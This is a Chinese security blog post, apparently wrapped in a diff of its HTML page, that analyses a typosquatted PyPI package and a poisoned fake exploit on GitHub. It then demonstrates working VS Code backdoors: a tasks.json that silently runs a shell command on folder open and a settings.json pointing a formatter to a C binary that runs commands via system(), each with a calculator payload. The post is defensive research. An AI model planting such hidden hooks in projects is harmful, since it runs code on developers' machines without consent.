@@ -1,0 +1,436 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!doctype html>
+<html lang="zh-cn">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+  <meta name="renderer" content="webkit">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, shrink-to-fit=no", user-scalable=no">
+  <title>利用 vscode 打造后门门中门背着键盘去流浪</title>
+  <link rel="shortcut icon" href="">
+  
+    
+    
+      <link rel="stylesheet" href="/css/bootstrap.min.css">
+    
+      <link rel="stylesheet" href="/css/font-awesome.min.css">
+    
+      <link rel="stylesheet" href="/css/atom-one-dark.css">
+    
+      <link rel="stylesheet" href="/css/jquery.fancybox.min.css">
+    
+      <link rel="stylesheet" href="/css/nprogress.min.css">
+    
+      <link rel="stylesheet" href="/css/valine.css">
+    
+      <link rel="stylesheet" href="/css/life.css">
+    
+  
+
+  
+
+  <!-- jQuery first, then Tether, then Bootstrap JS. -->
+  
+  
+  
+    <script src="/js/jquery-2.2.4.min.js"></script>
+  
+    <script src="https://cdn1.lncld.net/static/js/3.1.0/av-min.js"></script>
+  
+    <script src="/js/jquery.pjax.js"></script>
+  
+    <script src="/js/nprogress.min.js"></script>
+  
+    <script src="/js/tether.min.js"></script>
+  
+    <script src="/js/bootstrap.min.js"></script>
+  
+    <script src="/js/highlight.min.js"></script>
+  
+    <script src="/js/highlightjs-line-numbers.min.js"></script>
+  
+    <script src="/js/jquery.fancybox.js"></script>
+  
+    <script src="/js/jquery.qrcode.min.js"></script>
+  
+    <script src="/js/Valine.min.js"></script>
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+<script>AV.init({appId:'',appKey:''});</script>
+<script type="text/javascript">
+      var config = {
+            ClasS: 'Counter',
+            el:'.views',
+            elP: '.views-post'
+      }
+</script>
+<div class="container">
+    <div class="row blog-box-shadow">
+        <!--博客主栏开始-->
+        <div class="col-xl-9 col-lg-12 blog-main" id="pjax-box">
+            <header class="blog-header">
+                <a href="http://justfortest.cc" class="blog-header-mobile-title">背着键盘去流浪</a>
+                <a href="javascript:;" class="blog-header-navbar-btn"><i class="fa fa-bars"></i></a>
+                <nav class="blog-header-navbar blog-header-fixed">
+                    <ul class="blog-navbar-links">
+                        
+                          <li class="blog-nav-item"><a href="/" class="transition">首页</a></li>
+                        
+                          <li class="blog-nav-item"><a href="/about/" class="transition">关于</a></li>
+                        
+                        <div class="blog-navbar-right">
+                            <form action="">
+                                <div class="input-group">
+                                    <input type="text" class="blog-header-search" placeholder="search...">
+                                    <buttn type="submit" class="blog-header-search-btn"><i class="fa fa-search"></i></buttn>
+                                </div>
+                            </form>
+                        </div>
+                    </ul>
+                </nav>
+            </header>
+                
+<header class="blog-post-page-title">
+    <h4>利用 vscode 打造后门门中门</h4>
+    <time datetime="2022-10-14T02:25:00.000Z"><i class="fa fa-clock-o"></i>2022-10-14</time>
+    
+    
+    
+    
+	
+    
+</header>
+<div class="blog-main-post blog-post-page-box">
+    <article class="blog-post-block blog-post-page-content">
+        <section>
+            
+                <h1 id="利用-vscode-打造后门门中门"><a href="#利用-vscode-打造后门门中门" class="headerlink" title="利用 vscode 打造后门门中门"></a>利用 vscode 打造后门门中门</h1><p>本文最后更新于：2022年10月14日 上午</p>
+<p>俗话说，常在河边走…</p>
+<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>7.25 有位小伙伴在小群里发了这张截图：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/fcadd487-8933-4d3b-8cd9-fd9ee6108011.png!blog#width-zoom5"></p>
+<p><code>fake_useragent</code> 相信写爬虫比较多的橘友都用过，它可以随机生成一些看起来很合理的 ua，用来做一些简单的反反爬。这个恶意的库名叫 <code>fake_useragant</code>，就差一个字母。</p>
+<p>正好那段时间在护网，所以我想着不如分析分析看看是不是攻击队又有啥新手法了。</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>由于 pypi 官方响应非常快，这个包在我准备下载的时候已经被删除了。不过一般来说自建源和官方源的同步都存在一定的时间差，所以可以去清华源之类的下载（其实这个时候也可以看出自建源存在的弊端）。</p>
+<p>整个恶意库的源码非常简单：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/9d1abd82-258e-486b-8ca0-04e6689469cd.png!blog#width-zoom7"></p>
+<p>然后下载真正的 <code>fake_useragent</code> 做了一下 diff。其实直接看修改日期也可以看到哪些文件改掉了。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/4ff61ae1-27ba-47dd-8404-ad0e6aba9cbf.png!blog"></p>
+<p>除了名字替换之外，主要的修改在：</p>
+<ol>
+<li><code>fake.py</code> 中新增了 <code>FakeUserAgent.exit</code> 方法</li>
+<li>新增了 <code>urllib2.py</code>，里面有 <code>task</code> 和 <code>urlparse</code> 函数，还特意用 <code>import pickle as json</code> 做了个障眼法。<code>task</code> 会调用 <code>urlparse</code>，而 <code>urlparse</code> 函数包含了恶意的 payload</li>
+</ol>
+<p>恶意的 payload 解到最后是这样的：<br><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/6ab81083-c298-46af-adde-cc12edffbfc8.png!blog"></p>
+<p>感兴趣的橘友可以自行分析这段 shellcode 的作用。</p>
+<p>分析到此就结束了，这个后门并不复杂。问题是，通常恶意库的触发点都会放在 <code>setup.py</code> 下，但是我并没有在这个后门的源码中找到触发点，也就是说我直接 <code>pip install</code> 也不会有问题。这就很奇怪了。</p>
+<p>问了下小伙伴，说是有个人假装防守队，说自己捕获了攻击队的 0day 利用，所以写了个 exp 放到 GitHub 上了：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/FuckRedTeam/360tianqingRCE/blob/1326a51307e576b22a36ec79c466471af5e17086/360tianqing-RCE.py#L90">https://github.com/FuckRedTeam/360tianqingRCE/blob/1326a51307e576b22a36ec79c466471af5e17086/360tianqing-RCE.py#L90</a></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/a61067d8-a4a5-41a3-9126-105a39976ff6.png!blog#width-zoom5"></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/fd72b806-5618-4157-8ff5-4603ac3bde65.png!blog#width-zoom7"></p>
+<p>这鱼钓的。。。所以它俩是搭配使用的，这就说的通了。</p>
+<h2 id="vscode-能否触发后门？"><a href="#vscode-能否触发后门？" class="headerlink" title="vscode 能否触发后门？"></a>vscode 能否触发后门？</h2><p>至此，还剩最后一个问题，就是网传用 vscode 打开之后，点击信任文件夹也可能会被日。那么到底存不存在这种可能性呢？如果可能的话，那么具体要如何复现呢？</p>
+<h3 id="文件夹的信任模式"><a href="#文件夹的信任模式" class="headerlink" title="文件夹的信任模式"></a>文件夹的信任模式</h3><p>vscode 会在你打开一个新的文件夹时提示：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/vscode-door/3076b2de-b6f4-4357-b6d4-fc6e42d9123a.png!blog#width-zoom7"></p>
+<p>由于我没用过 vscode，一般用的是 sublime，所以我特意去官网上看了下这个操作的含义：</p>
+<p><a target="_blank" rel="noopener" href="https://code.visualstudio.com/docs/editor/workspace-trust#\_trusting-a-workspace">https://code.visualstudio.com/docs/editor/workspace-trust#\_trusting-a-workspace</a></p>
+<p>设置为不信任模式，主要是通过禁用或限制几个 vscode 功能的操作来阻止自动代码执行，包括：task、debug、工作区设置和插件。所以我们可以尝试通过这几种配置来制作后门。</p>
+<h3 id="门中门"><a href="#门中门" class="headerlink" title="门中门"></a>门中门</h3><p>为了实现我们的目的，首先需要创建一个 <code>.vscode</code> 目录。</p>
+<p>由于精力有限，我就测试了两种方式。</p>
+<h4 id="tasks-json-后门"><a href="#tasks-json-后门" class="headerlink" title="tasks.json 后门"></a>tasks.json 后门</h4><p>看了下 task 的配置，文件名就叫 <code>tasks.json</code>，配置如下：</p>
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16  </p>
+<pre><code>&#123;    &quot;version&quot;: &quot;1.0.0&quot;,    &quot;tasks&quot;: [        &#123;            &quot;label&quot;: &quot;x&quot;,            &quot;type&quot;: &quot;shell&quot;,            &quot;command&quot;: &quot;calc; open -a /System/Applications/Calculator.app&quot;,            &quot;presentation&quot;: &#123;                &quot;reveal&quot;: &quot;never&quot;            &#125;,            &quot;runOptions&quot;: &#123;                &quot;runOn&quot;: &quot;folderOpen&quot;,            &#125;        &#125;    ]&#125;
+</code></pre>
+<p>稍微解释一下：</p>
+<ol>
+<li><code>type</code>、<code>command</code>：用于配置自动执行的命令</li>
+<li><code>presentation</code> 的 <code>reveal</code> 需要设置为 <code>&quot;never&quot;</code>，这样执行 task 的时候就不会弹个控制台出来。</li>
+<li><code>runOptions</code> 的 <code>runOn</code> 设定为文件夹打开的时候就执行</li>
+</ol>
+<p>至于这个执行的命令，为了兼容多平台，可以用 <code>;</code> 分割写不同的指令，执行失败会继续尝试。</p>
+<p>这样，只要分析的时候不小心点了“信任”，就会触发这个后门。</p>
+<p>需要注意的是，提示是否信任的时候，如果点击得太慢，那么本次是不会触发 task 执行的（我猜测弹窗等待确认并不会阻塞执行 task 的逻辑，它们是并行的事件），但是下次打开必定会触发。</p>
+<h4 id="settings-json-后门"><a href="#settings-json-后门" class="headerlink" title="settings.json 后门"></a>settings.json 后门</h4><p>vscode 的配置比较多，我这里就举个例子说明吧。</p>
+<p><code>settings.json</code> 里可以给插件配置一个可执行文件的位置。如果这个可执行文件是后门，那么在格式化代码的时候就会触发：</p>
+<p>1<br>2<br>3<br>4<br>5<br>6  </p>
+<pre><code>&#123;    &quot;files.autoSave&quot;: &quot;onWindowChange&quot;,    &quot;editor.formatOnSave&quot;: true,    &quot;editor.formatOnPaste&quot;: true,    &quot;python.formatting.autopep8Path&quot;: &quot;.vscode/a.out&quot;,&#125;
+</code></pre>
+<ol>
+<li><code>python.formatting.autopep8Path</code> 将 <code>autopep8</code> 的可执行文件指向我们的后门。需要注意的是这里似乎无法使用 shell 脚本，必须要是一个二进制类型的可执行文件</li>
+<li><code>editor.formatOnPaste</code>（声明文件在保存时自动格式化代码；）、<code>editor.formatOnPaste</code>（声明文件在粘贴时自动格式化代码）、<code>files.autoSave</code>（文件在 vscode 失去焦点时自动保存），这三者都是为了提高触发后门的几率</li>
+</ol>
+<p>接下来只需要写个恶意的二进制文件就行了：</p>
+<p>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13  </p>
+<pre><code>#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) &#123;    char str[300] = &#123;&#125;;    strcat(str, &quot;open -a /System/Applications/Calculator.app; autopep8 &quot;);    strcat(str, argv[1]);    strcat(str, &quot; &quot;);    strcat(str, argv[2]);    system(str);    return 0;&#125;
+</code></pre>
+<p>恶意指令后面加个 <code>autopep8</code> 以及传入的参数用于正常地去格式化代码，尽量做到无感。</p>
+<p>需要注意的是这个可执行文件不要随意打印内容，否则会执行失败，具体原因我也懒得研究了。</p>
+<p>最后我们可以故意把源码弄成很乱的格式，正常一看这么乱肯定就要先格式化一下，然后就 G 了。</p>
+<p>源码都打包传到 pypi 去了，payload 就是弹个计算器而已，没有攻击性的 payload，感兴趣可以自己尝试一下：</p>
+<blockquote>
+<p>源码</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/vscode-door">https://github.com/Macr0phag3/vscode-door</a></p>
+<blockquote>
+<p>py 库地址</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://pypi.org/project/fake-usreagant/0.0.3/#files">https://pypi.org/project/fake-usreagant/0.0.3/#files</a></p>
+<p>要做到比较完善的话，可能需要搜集下类似的插件，尽可能把可执行文件路径的配置覆盖全。同时其他配置也可能可以制作后门。</p>
+<p>最后再说一点，vscode 在信任的时候有个选项，可以勾选是否信任父文件夹，<strong>这个一定要谨慎打钩</strong>。一个常见的攻击场景是，某安全工程师由于经常需要下载源码预览，为了方便就把整个下载目录设为可信目录。这个时候只要下到一个带有 <code>.vscode</code> 的恶意源码就会中招。</p>
+<p>并且其他编辑器例如 idea 或许也存在这个问题，精力有限，就不测试了。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>其实 <code>360tianqing-RCE.py</code> 那个仓库最好再加个 <code>requirement.txt</code>，这样可能会有人直接 <code>pip install -r requirement.txt</code> 了，中招的概率进一步增大，这一点没啥好说的，不管是不是敏感时期，拿到 exp 都要仔细看看啊。</p>
+<p>其次就是分析恶意软件或者源码的时候尽量在虚拟机进行吧。像 vscode 这种信任，说实话，绝大部分人都会点信任，在河边走哪有不湿鞋，还是小心点为妙。</p>
+<p>你你你居然在 exp 里下毒！<br><img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png"></p>
+<hr>
+<p><a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">经验总结</a></p>
+<p><a href="/tags/Web/">#Web</a></p>
+<p>利用 vscode 打造后门门中门</p>
+<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/08/11/vscode-door/">https://www.tr0y.wang/2022/08/11/vscode-door/</a></p>
+<p>作者</p>
+<p>Tr0y</p>
+<p>发布于</p>
+<p>2022年8月11日</p>
+<p>更新于</p>
+<p>2022年10月14日</p>
+<p>许可协议</p>
+<p><a href="/2022/09/26/OrangeKiller_CTF_3/" title="OrangeKiller CTF 第 3 期">OrangeKiller CTF 第 3 期 上一篇</a></p>
+<p><a href="/2022/08/05/SecMap-SSTI-tornado/" title="SecMap - SSTI（Tornado）">SecMap - SSTI（Tornado） 下一篇</a></p>
+<p>Fluid.utils.loadComments(‘#comments’, function() { var light &#x3D; ‘github-light’; var dark &#x3D; ‘github-dark’; var schema &#x3D; document.documentElement.getAttribute(‘data-user-color-scheme’); if (schema &#x3D;&#x3D;&#x3D; ‘dark’) { schema &#x3D; dark; } else { schema &#x3D; light; } window.UtterancesThemeLight &#x3D; light; window.UtterancesThemeDark &#x3D; dark; var s &#x3D; document.createElement(‘script’); s.setAttribute(‘src’, ‘<a target="_blank" rel="noopener" href="https://utteranc.es/client.js">https://utteranc.es/client.js</a>‘); s.setAttribute(‘repo’, ‘Macr0phag3&#x2F;Macr0phag3.github.io’); s.setAttribute(‘issue-term’, ‘title’); s.setAttribute(‘label’, ‘comment’); s.setAttribute(‘theme’, schema); s.setAttribute(‘crossorigin’, ‘anonymous’); document.getElementById(‘comments’).appendChild(s); })</p>
+<p>Please enable JavaScript to view the comments</p>
+<p> 目录</p>
+<p><a href="#"></a></p>
+<h4 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h4><p>×</p>
+<p> 关键词</p>
+<p><a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> <a target="_blank" rel="noopener" href="https://github.com/fluid-dev/hexo-theme-fluid">Fluid</a></p>
+<p>总访问量 次 总访客数 人</p>
+<p>  NProgress.configure({“showSpinner”:false,”trickleSpeed”:100}) NProgress.start() window.addEventListener(‘load’, function() { NProgress.done(); })        (function (window, document) { var typing &#x3D; Fluid.plugins.typing; var subtitle &#x3D; document.getElementById(‘subtitle’); if (!subtitle || !typing) { return; } var text &#x3D; subtitle.getAttribute(‘data-typed-text’); typing(text); })(window, document);    Fluid.utils.createScript(‘<a target="_blank" rel="noopener" href="https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js">https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js</a>‘, function() { var toc &#x3D; jQuery(‘#toc’); if (toc.length &#x3D;&#x3D;&#x3D; 0 || !window.tocbot) { return; } var boardCtn &#x3D; jQuery(‘#board-ctn’); var boardTop &#x3D; boardCtn.offset().top; window.tocbot.init({ tocSelector : ‘#toc-body’, contentSelector : ‘.markdown-body’, headingSelector : CONFIG.toc.headingSelector || ‘h1,h2,h3,h4,h5,h6’, linkClass : ‘tocbot-link’, activeLinkClass : ‘tocbot-active-link’, listClass : ‘tocbot-list’, isCollapsedClass: ‘tocbot-is-collapsed’, collapsibleClass: ‘tocbot-is-collapsible’, collapseDepth : CONFIG.toc.collapseDepth || 0, scrollSmooth : true, headingsOffset : -boardTop }); if (toc.find(‘.toc-list-item’).length &gt; 0) { toc.css(‘visibility’, ‘visible’); } });   Fluid.plugins.codeWidget();  Fluid.utils.createScript(‘<a target="_blank" rel="noopener" href="https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js">https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js</a>‘, function() { window.anchors.options &#x3D; { placement: CONFIG.anchorjs.placement, visible : CONFIG.anchorjs.visible }; if (CONFIG.anchorjs.icon) { window.anchors.options.icon &#x3D; CONFIG.anchorjs.icon; } var el &#x3D; (CONFIG.anchorjs.element || ‘h1,h2,h3,h4,h5,h6’).split(‘,’); var res &#x3D; []; for (var item of el) { res.push(‘.markdown-body &gt; ‘ + item.trim()); } if (CONFIG.anchorjs.placement &#x3D;&#x3D;&#x3D; ‘left’) { window.anchors.options.class &#x3D; ‘anchorjs-link-left’; } window.anchors.add(res.join(‘, ‘)); });   Fluid.utils.createScript(‘<a target="_blank" rel="noopener" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js">https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js</a>‘, function() { Fluid.plugins.fancyBox(); });  Fluid.plugins.imageCaption();  if (!window.MathJax) { window.MathJax &#x3D; { tex : { inlineMath: { ‘[+]‘: [[‘$’, ‘$’]] } }, loader : { load: [‘ui&#x2F;lazy’] }, options: { renderActions: { insertedScript: [200, () &#x3D;&gt; { document.querySelectorAll(‘mjx-container’).forEach(node &#x3D;&gt; { let target &#x3D; node.parentNode; if (target.nodeName.toLowerCase() &#x3D;&#x3D;&#x3D; ‘li’) { target.parentNode.classList.add(‘has-jax’); } }); }, ‘’, false] } } }; } else { MathJax.startup.document.state(0); MathJax.texReset(); MathJax.typeset(); MathJax.typesetPromise(); }     </p>
+<p>博客在允许 JavaScript 运行的环境下浏览效果更佳</p>
+
+            
+        </section>
+        <footer class="blog-post-page-tags">
+        
+			
+		
+        </footer>
+    </article>
+    <article class="blog-post-page-readmore">
+    	
+    	
+		
+
+		
+		
+			<a href="/2021/10/07/crawler-source-learn/" class="blog-post-page-readmore-next" data-toggle="tooltip" data-placement="top" title="crawlergo 动态爬虫 源码学习">下一篇</a>
+		
+
+        <div style="clear: both;"></div>
+    </article>
+
+    <article class="blog-post-block blog-post-page-content">
+            <div class="row">
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span class="post-comments-btn btn btn-info btn-block" data-toggle="tooltip" data-placement="top" title="本站采用Disqus评论组件，若您没有科学上网可能会无法查看并评论">加载评论</span>
+                </div>
+            
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span  data-toggle="modal" data-target="#post-donate-content">
+                        <span id="post-donate-btn" class="btn btn-danger btn-block" data-toggle="tooltip" data-placement="top" title="如果您觉得本文还不错或者对您有帮助，可以考虑打赏一下作者哦">打赏本文</span>
+                    </span>
+                </div>
+                <div class="col-md-4 col-sm-4 post-page-more-btn">
+                    <span  data-toggle="modal" data-target="#post-qrcode-content">
+                        <span><span id="post-qrcode-btn" class="btn btn-success btn-block" data-toggle="tooltip" data-placement="top" title="微信扫描二维码手机端查看本文及分享本文">二维码</span></span>
+                    </span>
+                </div>
+            </div>
+        <div class="post-more-function-br"></div>
+
+        <div class="modal fade" id="post-donate-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">打赏本文</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-donate-content">
+                            <div class="col-md-4">
+                                <p>支付宝</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                            <div class="col-md-4">
+                                <p>微信</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                            <div class="col-md-4">
+                                <p>财付通</p>
+                                <img class="post-donate-content-img no-lightbox" src="http://i.niupic.com/images/2022/12/30/aepT.png"/>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="modal fade" id="post-qrcode-content" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog modal-sm" role="document">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">文章二维码</h5>
+                        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+                            <span aria-hidden="true">&times;</span>
+                        </button>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row post-qrcode-content">
+                            <span class="post-qrcode-content-canvas"></span>
+                            <img class="post-qrcode-content-img no-lightbox" src=""/>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-dismiss="modal">关闭</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            // post QRcode
+            // 中文转码
+            function toUtf8(str) {
+                var out, i, len, c;
+                out = "";
+                len = str.length;
+                for (i = 0; i < len; i++) {
+                    c = str.charCodeAt(i);
+                    if ((c >= 0x0001) && (c <= 0x007F)) {
+                        out += str.charAt(i);
+                    } else if (c > 0x07FF) {
+                        out += String.fromCharCode(0xE0 | ((c >> 12) & 0x0F));
+                        out += String.fromCharCode(0x80 | ((c >> 6) & 0x3F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    } else {
+                        out += String.fromCharCode(0xC0 | ((c >> 6) & 0x1F));
+                        out += String.fromCharCode(0x80 | ((c >> 0) & 0x3F));
+                    }
+                }
+                return out;
+            }
+            // 生成
+            var qrcode= $('.post-qrcode-content-canvas').qrcode({width: 150,height: 150,text: toUtf8("http://justfortest.cc/2022/10/14/vscode-backdoor/")}).hide();
+            var canvas=qrcode.find('canvas').get(0);
+            $('.post-qrcode-content-img').attr('src',canvas.toDataURL('image/jpg'));
+        </script>
+
+        
+    </article>
+    
+</div>
+
+                
+            <footer class="blog-footer">
+                <p class="blog-footer-left">Copyright © 2017 <a href="http://justfortest.cc">背着键盘去流浪</a></p>
+                <p class="blog-footer-right">Powered by <a href="https://hexo.io" target="_blank">Hexo</a>,Themes <a href="https://weic.me/themes-life/" target="_blank">Life</a></p>
+            </footer>
+        </div><!--博客主栏结束-->
+        <!--博客侧边栏开始-->
+        <div class="col-xl-3 blog-sidebar">
+            <div class="blog-sidebar-title">
+                <a href="">背着键盘去流浪</a>
+            </div>
+            <div class="blog-sidebar-logo">
+                <img src="http://i.niupic.com/images/2022/12/30/aepT.png">
+            </div>
+            <div class="blog-sidebar-count blog-sidebar-padding">
+                <div class="blog-sidebar-count-left">
+                    <p class="blog-sidebar-count-p">11</p>
+                    <span class="blog-sidebar-count-span">文章</span>
+                </div>
+                <div class="blog-sidebar-count-right">
+                    <p class="blog-sidebar-count-p">0</p>
+                    <span class="blog-sidebar-count-span">标签</span>
+                </div>
+                <div style="clear: both;"></div>
+            </div>
+            <div class="blog-sidebar-icon blog-sidebar-padding">
+                <ul>
+                    <li><a href="" class="icon-github" target="_blank" data-toggle="tooltip" data-placement="top" title="Github"><i class="fa fa-github"></i></a></li>
+                    <li><a href="" class="icon-weibo" target="_blank" data-toggle="tooltip" data-placement="top" title="新浪微博"><i class="fa fa-weibo"></i></a></li>
+                    <li><a href="" class="icon-twitter" target="_blank" data-toggle="tooltip" data-placement="top" title="Twitter"><i class="fa fa-twitter"></i></a></li>
+                    <!--<li><a href="" class="icon-facebook" target="_blank" data-toggle="tooltip" data-placement="top" title="FaceBook"><i class="fa fa-facebook"></i></a></li>-->
+                    <li><a href="mailto:" class="icon-email" data-toggle="tooltip" data-placement="top" title="E-Mail"><i class="fa fa-envelope"></i></a></li>
+                    <li><a href="" class="icon-rss" data-toggle="tooltip" target="_blank" data-placement="top" title="RSS"><i class="fa fa-rss"></i></a></li>
+                </ul>
+            </div>
+            <div class="blog-sidebar-categories">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-folder-open"></i>&nbsp;文章分类</h4>
+                <ul class="list-group blog-sidebar-padding">
+                  
+                </ul>
+            </div>
+            <div class="blog-sidebar-tags">
+                <h4 class="blog-sidebar-h4"><i class="fa fa-tag"></i>&nbsp;标签云</h4>
+                <ul class="blog-sidebar-tags-ul blog-sidebar-padding">
+                  
+                </ul>
+            </div>
+            <script>
+              // 博客侧栏标签云随机色
+              var tag_cloud = $('.tag-could');
+              tag_cloud.each(function () {
+                  var Cnum = 9;
+                  var Crand = parseInt(Math.random() * Cnum);
+                  $(this).addClass("tag-could" + Crand);
+              })
+            </script>
+            <!--返回顶部按钮-->
+            <div class="retop">
+                <i class="fa fa-angle-up"></i>
+            </div>
+        </div><!--博客侧边栏结束-->
+    </div>
+</div>
+<script src="/js/LeanStatistics.min.js"></script>
+<script src="/js/Life.js"></script>
+<script type="text/javascript">
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+    otherF();
+    LeanStatistics();
+    $(document).pjax('a', '#pjax-box', {fragment:'#pjax-box', timeout:8000}).on('pjax:complete', function() {
+      $('pre code').each(function(i, block){
+        hljs.highlightBlock(block);
+      })
+      $('code.hljs').each(function(i, block) {
+        hljs.lineNumbersBlock(block);
+      });
+      LeanStatistics();
+    }).on('pjax:start', function() { NProgress.start(); }).on('pjax:end',   function() {
+      NProgress.done();
+      otherF();
+    });
+</script>
+</body>
+</html>
